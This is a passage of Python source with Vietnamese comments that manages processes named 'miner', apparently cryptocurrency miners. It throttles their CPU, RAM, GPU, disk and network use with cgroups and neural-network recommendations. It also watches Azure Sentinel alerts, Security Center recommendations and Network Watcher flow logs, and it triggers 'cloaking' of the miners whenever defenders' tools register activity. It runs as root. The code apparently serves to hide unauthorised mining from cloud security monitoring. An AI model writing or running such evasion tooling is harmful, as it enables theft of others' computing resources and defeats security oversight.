        logger.info("ResourceManager đã được khởi động thành công.")

    def stop(self):
        self.stop_event.set()
        self.monitor_thread.join()
        self.optimization_thread.join()
        self.cloaking_thread.join()
        if self.gpu_initialized:
            try:
                pynvml.nvmlShutdown()
                logger.info("NVML shutdown successfully.")
            except pynvml.NVMLError as e:
                logger.error(f"Lỗi khi shutdown NVML: {e}")
        logger.info("Đã dừng ResourceManager thành công.")

    def optimize_resources(self):
        """
        Hàm tối ưu hóa tài nguyên dựa trên mô hình AI.
        """
        optimization_interval = self.config.get("monitoring_parameters", {}).get("optimization_interval_seconds", 30)
        while not self.stop_event.is_set():
            try:
                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        process.update_resource_usage()

                self.allocate_resources_with_priority()

                # Tối ưu hóa tài nguyên dựa trên mô hình AI (phần phân phối tải động)
                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        current_state = {
                            'cpu_percent': process.cpu_usage,
                            'cpu_count': psutil.cpu_count(logical=True),
                            'cpu_freq_mhz': temperature_monitor.get_cpu_freq(process.pid),
                            'ram_percent': process.memory_usage,
                            'ram_total_mb': psutil.virtual_memory().total / (1024 * 1024),
                            'ram_available_mb': psutil.virtual_memory().available / (1024 * 1024),
                            'cache_percent': temperature_monitor.get_cache_percent(),
                            'gpus': [
                                {
                                    'gpu_percent': process.gpu_usage,
                                    'memory_percent': temperature_monitor.get_gpu_memory_percent(process.pid),
                                    'temperature_celsius': temperature_monitor.get_gpu_temperature(process.pid)
                                }
                            ],
                            'disk_io_limit_mbps': process.disk_io,
                            'network_bandwidth_limit_mbps': process.network_io
                        }

                        input_features = self.prepare_input_features(current_state)

                        input_tensor = torch.tensor(input_features, dtype=torch.float32).to(self.device)
                        input_tensor = input_tensor.unsqueeze(0)

                        with torch.no_grad():
                            predictions = self.resource_optimization_model(input_tensor)
                            recommended_action = predictions.squeeze(0).cpu().numpy()

                        logger.debug(f"Hành động được mô hình AI đề xuất cho tiến trình {process.name} (PID: {process.pid}): {recommended_action}")

                        self.apply_recommended_action(recommended_action, process)

            except Exception as e:
                logger.error(f"Lỗi trong quá trình tối ưu hóa tài nguyên: {e}")

            sleep(optimization_interval)  # Chờ trước khi tối ưu lại

    def apply_recommended_action(self, action, process):
        with self.resource_lock:
            try:
                # Giả sử action bao gồm các chỉ số sau:
                # [cpu_threads, ram_allocation_mb, gpu_usage_percent..., disk_io_limit_mbps, network_bandwidth_limit_mbps, cache_limit_percent]
                cpu_threads = int(action[0])
                ram_allocation_mb = int(action[1])
                # Số lượng GPU usage percent phụ thuộc vào cấu hình
                gpu_usage_percent = []
                gpu_config = self.config.get("resource_allocation", {}).get("gpu", {}).get("max_usage_percent", [])
                if gpu_config:
                    gpu_usage_percent = list(action[2:2 + len(gpu_config)])
                disk_io_limit_mbps = float(action[-3])
                network_bandwidth_limit_mbps = float(action[-2])
                cache_limit_percent = float(action[-1])

                # Lấy các bước điều chỉnh từ cấu hình
                optimization_params = self.config.get("optimization_parameters", {})
                cpu_thread_step = optimization_params.get("cpu_thread_adjustment_step", 1)
                ram_allocation_step = optimization_params.get("ram_allocation_step_mb", 256)
                gpu_power_step = optimization_params.get("gpu_power_adjustment_step", 10)
                disk_io_step = optimization_params.get("disk_io_limit_step_mbps", 1)
                network_bw_step = optimization_params.get("network_bandwidth_limit_step_mbps", 1)
                cache_limit_step = optimization_params.get("cache_limit_step_percent", 5)

                resource_dict = {}

                # Điều chỉnh CPU Threads
                current_cpu_threads = temperature_monitor.get_current_cpu_threads(process.pid)
                if cpu_threads > current_cpu_threads:
                    new_cpu_threads = current_cpu_threads + cpu_thread_step
                else:
                    new_cpu_threads = current_cpu_threads - cpu_thread_step
                new_cpu_threads = max(self.config["resource_allocation"]["cpu"]["min_threads"],
                                      min(new_cpu_threads, self.config["resource_allocation"]["cpu"]["max_threads"]))
                resource_dict['cpu_threads'] = new_cpu_threads
                logger.info(f"Đã điều chỉnh CPU threads thành {new_cpu_threads} cho tiến trình {process.name} (PID: {process.pid})")

                # Điều chỉnh RAM Allocation
                current_ram_allocation_mb = temperature_monitor.get_current_ram_allocation(process.pid)
                if ram_allocation_mb > current_ram_allocation_mb:
                    new_ram_allocation_mb = current_ram_allocation_mb + ram_allocation_step
                else:
                    new_ram_allocation_mb = ram_allocation_mb - ram_allocation_step
                new_ram_allocation_mb = max(self.config["resource_allocation"]["ram"]["min_allocation_mb"],
                                            min(new_ram_allocation_mb, self.config["resource_allocation"]["ram"]["max_allocation_mb"]))
                resource_dict['memory'] = new_ram_allocation_mb
                logger.info(f"Đã điều chỉnh RAM allocation thành {new_ram_allocation_mb}MB cho tiến trình {process.name} (PID: {process.pid})")

                # Gán các giới hạn tài nguyên vào cgroups
                assign_process_to_cgroups(process.pid, resource_dict, logger)

                # Điều chỉnh GPU Usage Percent
                if gpu_usage_percent:
                    current_gpu_usage_percent = temperature_monitor.get_current_gpu_usage(process.pid)
                    new_gpu_usage_percent = [min(max(gpu + gpu_power_step, 0), 100) for gpu in gpu_usage_percent]
                    power_management.set_gpu_usage(process.pid, new_gpu_usage_percent)
                    logger.info(f"Đã điều chỉnh GPU usage percent thành {new_gpu_usage_percent} cho tiến trình {process.name} (PID: {process.pid})")
                else:
                    logger.warning(f"Không có thông tin GPU để điều chỉnh cho tiến trình {process.name} (PID: {process.pid}).")

                # Điều chỉnh Disk I/O Limit
                current_disk_io_limit_mbps = temperature_monitor.get_current_disk_io_limit(process.pid)
                if disk_io_limit_mbps > current_disk_io_limit_mbps:
                    new_disk_io_limit_mbps = current_disk_io_limit_mbps + disk_io_step
                else:
                    new_disk_io_limit_mbps = disk_io_limit_mbps - disk_io_step
                new_disk_io_limit_mbps = max(self.config["resource_allocation"]["disk_io"]["limit_mbps"],
                                             min(new_disk_io_limit_mbps, self.config["resource_allocation"]["disk_io"]["limit_mbps"]))
                resource_dict['disk_io_limit_mbps'] = new_disk_io_limit_mbps
                logger.info(f"Đã điều chỉnh Disk I/O limit thành {new_disk_io_limit_mbps} Mbps cho tiến trình {process.name} (PID: {process.pid})")

                # Gán lại Disk I/O Limit
                assign_process_to_cgroups(process.pid, {'disk_io_limit_mbps': new_disk_io_limit_mbps}, logger)

                # Điều chỉnh Network Bandwidth Limit qua Cloak Strategy
                network_cloak = self.config['cloak_strategies'].get('network', {})
                network_bandwidth_limit_mbps = network_bandwidth_limit_mbps
                network_cloak_strategy = NetworkCloakStrategy(network_cloak, logger)
                network_cloak_strategy.apply(process)

                # Điều chỉnh Cache Limit Percent qua Cloak Strategy
                cache_cloak = self.config['cloak_strategies'].get('cache', {})
                cache_limit_percent = cache_limit_percent
                cache_cloak_strategy = CacheCloakStrategy(cache_cloak, logger)
                cache_cloak_strategy.apply(process)

                logger.info(f"Đã áp dụng các điều chỉnh tài nguyên dựa trên mô hình AI cho tiến trình {process.name} (PID: {process.pid}).")
            except Exception as e:
                logger.error(f"Lỗi khi áp dụng các điều chỉnh tài nguyên cho tiến trình {process.name} (PID: {process.pid}): {e}")


class AnomalyDetector:
    """
    Lớp phát hiện bất thường, giám sát baseline và áp dụng cloaking khi cần thiết.
    """
    def __init__(self):
        # Tải cấu hình và mô hình AI
        self.config = self.load_config()
        self.anomaly_cloaking_model, self.device = self.load_model(ANOMALY_CLOAKING_MODEL_PATH)

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Danh sách tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = Lock()

        # Khởi tạo luồng phát hiện bất thường
        self.anomaly_thread = Thread(target=self.anomaly_detection, name="AnomalyDetectionThread", daemon=True)

        # Initialize NVML once
        try:
            pynvml.nvmlInit()
            self.gpu_initialized = True
            logger.info("NVML initialized successfully.")
        except pynvml.NVMLError as e:
            logger.error(f"Failed to initialize NVML: {e}")
            self.gpu_initialized = False

        # Lấy instance của ResourceManager để gửi yêu cầu cloaking
        self.resource_manager = ResourceManager.get_instance()

        # Khởi tạo các client Azure
        self.azure_sentinel_client = self.resource_manager.azure_sentinel_client
        self.azure_log_analytics_client = self.resource_manager.azure_log_analytics_client
        self.azure_security_center_client = self.resource_manager.azure_security_center_client
        self.azure_network_watcher_client = self.resource_manager.azure_network_watcher_client
        self.azure_traffic_analytics_client = self.resource_manager.azure_traffic_analytics_client

    def load_config(self):
        config_path = CONFIG_DIR / "resource_config.json"
        try:
            with open(config_path, 'r') as f:
                config = json.load(f)
            logger.info(f"Đã tải cấu hình từ {config_path}")
            self.validate_config(config)
            return config
        except FileNotFoundError:
            logger.error(f"Tệp cấu hình không tồn tại: {config_path}")
            raise
        except json.JSONDecodeError as e:
            logger.error(f"Lỗi cú pháp JSON trong tệp {config_path}: {e}")
            raise

    def validate_config(self, config):
        required_keys = [
            "ai_driven_monitoring",
            "cloak_strategies"
        ]
        for key in required_keys:
            if key not in config:
                logger.error(f"Thiếu khóa cấu hình: {key}")
                raise KeyError(f"Thiếu khóa cấu hình: {key}")

    @retry(Exception, tries=3, delay=2, backoff=2)
    def load_model(self, model_path):
        if not Path(model_path).exists():
            logger.error(f"Mô hình AI không tồn tại tại: {model_path}")
            raise FileNotFoundError(f"Mô hình AI không tồn tại tại: {model_path}")
        device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        try:
            model = torch.load(model_path, map_location=device)
            model.eval()
            logger.info(f"Đã tải mô hình AI từ {model_path}")
            return model, device
        except Exception as e:
            logger.error(f"Lỗi khi tải mô hình AI từ {model_path}: {e}")
            raise e

    def discover_mining_processes(self):
        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                if 'miner' in proc.info['name'].lower():
                    priority = self.resource_manager.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface)
                    self.mining_processes.append(mining_proc)
            logger.info(f"Đã phát hiện {len(self.mining_processes)} tiến trình khai thác.")

    def anomaly_detection(self):
        detection_interval = self.config.get("ai_driven_monitoring", {}).get("detection_interval_seconds", 60)
        cloak_activation_delay = self.config.get("ai_driven_monitoring", {}).get("cloak_activation_delay_seconds", 5)
        while not self.stop_event.is_set():
            try:
                self.discover_mining_processes()

                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        process.update_resource_usage()
                        current_state = self.collect_metrics(process)

                        # Thu thập dữ liệu từ Azure Sentinel
                        alerts = self.azure_sentinel_client.get_recent_alerts(days=1)
                        if alerts:
                            logger.warning(f"Đã phát hiện {len(alerts)} alerts từ Azure Sentinel cho tiến trình PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue  # Tiến trình này sẽ được cloaking ngay lập tức

                        # Thu thập dữ liệu từ Azure Log Analytics
                        query = f"Heartbeat | where Computer == '{process.name}' | summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
                        logs = self.azure_log_analytics_client.query_logs(query)
                        if logs:
                            # Xử lý logs và xác định bất thường
                            pass  # Thêm logic cụ thể nếu cần

                        # Thu thập dữ liệu từ Azure Security Center
                        recommendations = self.azure_security_center_client.get_security_recommendations()
                        if recommendations:
                            logger.warning(f"Đã phát hiện {len(recommendations)} security recommendations từ Azure Security Center.")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue

                        # Thu thập dữ liệu từ Azure Network Watcher
                        flow_logs = self.azure_network_watcher_client.get_flow_logs(
                            resource_group=self.config['resource_group'],
                            network_watcher_name=self.config['network_watcher_name'],
                            nsg_name=self.config['nsg_name']
                        )
                        if flow_logs:
                            logger.warning(f"Đã phát hiện flow logs từ Azure Network Watcher cho tiến trình PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue

                        # Thu thập dữ liệu từ Azure Traffic Analytics (nếu cần)
                        traffic_data = self.azure_traffic_analytics_client.get_traffic_data()
                        if traffic_data:
                            logger.warning(f"Đã phát hiện traffic anomalies từ Azure Traffic Analytics cho tiến trình PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue

                        # Tiếp tục với phân tích mô hình AI
                        input_features = self.prepare_input_features(current_state)
                        input_tensor = torch.tensor(input_features, dtype=torch.float32).to(self.device)
                        input_tensor = input_tensor.unsqueeze(0)

                        with torch.no_grad():
                            prediction = self.anomaly_cloaking_model(input_tensor)
                            anomaly_score = prediction.item()

                        logger.debug(f"Anomaly score cho tiến trình {process.name} (PID: {process.pid}): {anomaly_score}")

                        detection_threshold = self.config['ai_driven_monitoring']['anomaly_cloaking_model']['detection_threshold']
                        is_anomaly = anomaly_score > detection_threshold

                        if is_anomaly:
                            logger.warning(f"Đã phát hiện bất thường trong tiến trình {process.name} (PID: {process.pid}). Bắt đầu cloaking sau {cloak_activation_delay} giây.")
                            sleep(cloak_activation_delay)
                            self.resource_manager.cloaking_request_queue.put(process)

            except Exception as e:
                logger.error(f"Lỗi trong anomaly_detection: {e}")
            sleep(detection_interval)

    def collect_metrics(self, process):
        current_state = {
            'cpu_percent': process.cpu_usage,
            'cpu_count': psutil.cpu_count(logical=True),
            'cpu_freq_mhz': temperature_monitor.get_cpu_freq(process.pid),
            'ram_percent': process.memory_usage,
            'ram_total_mb': psutil.virtual_memory().total / (1024 * 1024),
            'ram_available_mb': psutil.virtual_memory().available / (1024 * 1024),
            'cache_percent': temperature_monitor.get_cache_percent(),
            'gpus': [
                {
                    'gpu_percent': process.gpu_usage,
                    'memory_percent': temperature_monitor.get_gpu_memory_percent(process.pid),
                    'temperature_celsius': temperature_monitor.get_gpu_temperature(process.pid)
                }
            ],
            'disk_io_limit_mbps': process.disk_io,
            'network_bandwidth_limit_mbps': process.network_io
        }
        return current_state

    def prepare_input_features(self, current_state):
        input_features = [
            current_state['cpu_percent'],
            current_state['cpu_count'],
            current_state['cpu_freq_mhz'],
            current_state['ram_percent'],
            current_state['ram_total_mb'],
            current_state['ram_available_mb'],
            current_state['cache_percent']
        ]

        for gpu in current_state['gpus']:
            input_features.extend([
                gpu['gpu_percent'],
                gpu['memory_percent'],
                gpu['temperature_celsius']
            ])

        input_features.extend([
            current_state['disk_io_limit_mbps'],
            current_state['network_bandwidth_limit_mbps']
        ])

        return input_features

    def start(self):
        logger.info("Đang khởi động AnomalyDetector...")
        self.anomaly_thread.start()
        logger.info("AnomalyDetector đã được khởi động thành công.")

    def stop(self):
        self.stop_event.set()
        self.anomaly_thread.join()
        if self.gpu_initialized:
            try:
                pynvml.nvmlShutdown()
                logger.info("NVML shutdown successfully.")
            except pynvml.NVMLError as e:
                logger.error(f"Lỗi khi shutdown NVML: {e}")
        logger.info("Đã dừng AnomalyDetector thành công.")


class SystemManager:
    """
    Lớp kết hợp cả ResourceManager và AnomalyDetector, đảm bảo rằng hai lớp này hoạt động đồng bộ và không gây xung đột khi truy cập các tài nguyên chung.
    """
    def __init__(self):
        self.resource_manager = ResourceManager.get_instance()
        self.anomaly_detector = AnomalyDetector()

    def start(self):
        logger.info("Đang khởi động SystemManager...")
        self.resource_manager.start()
        self.anomaly_detector.start()
        logger.info("SystemManager đã được khởi động thành công.")

    def stop(self):
        logger.info("Đang dừng SystemManager...")
        self.resource_manager.stop()
        self.anomaly_detector.stop()
        logger.info("Đã dừng SystemManager thành công.")


def start():
    # Kiểm tra xem các mô hình AI có tồn tại không
    if not RESOURCE_OPTIMIZATION_MODEL_PATH.exists():
        logger.error(f"Mô hình AI không tồn tại tại: {RESOURCE_OPTIMIZATION_MODEL_PATH}")
        sys.exit(1)
    if not ANOMALY_CLOAKING_MODEL_PATH.exists():
        logger.error(f"Mô hình AI không tồn tại tại: {ANOMALY_CLOAKING_MODEL_PATH}")
        sys.exit(1)

    system_manager = SystemManager()
    system_manager.start()

    # Gán CPU Pinning ngay khi tiến trình 'miner' bắt đầu
    miner_found = False
    for proc in psutil.process_iter(['pid', 'name']):
        if 'miner' in proc.info['name'].lower():
            # Sử dụng assign_process_to_cgroups thay vì pin_process_to_cpu
            assign_process_to_cgroups(proc.info['pid'], {'cpu_threads': 2}, logger)  # Gán vào cores 0 và 1
            logger.info(f"Gán CPU Pinning cho tiến trình 'miner' (PID: {proc.info['pid']}) vào cores [0, 1].")
            miner_found = True
    if not miner_found:
        logger.warning("Không tìm thấy tiến trình 'miner' để gán CPU Pinning ngay khi khởi động.")

    # Giữ cho thread SystemManager chạy liên tục
    try:
        while True:
            sleep(1)
    except KeyboardInterrupt:
        logger.info("Nhận tín hiệu dừng từ người dùng. Đang dừng SystemManager...")
        system_manager.stop()
    except Exception as e:
        logger.error(f"Lỗi khi chạy SystemManager: {e}")
        system_manager.stop()
        sys.exit(1)


if __name__ == "__main__":
    # Đảm bảo script chạy với quyền root
    if os.geteuid() != 0:
        print("Script phải được chạy với quyền root.")
        sys.exit(1)

    start()
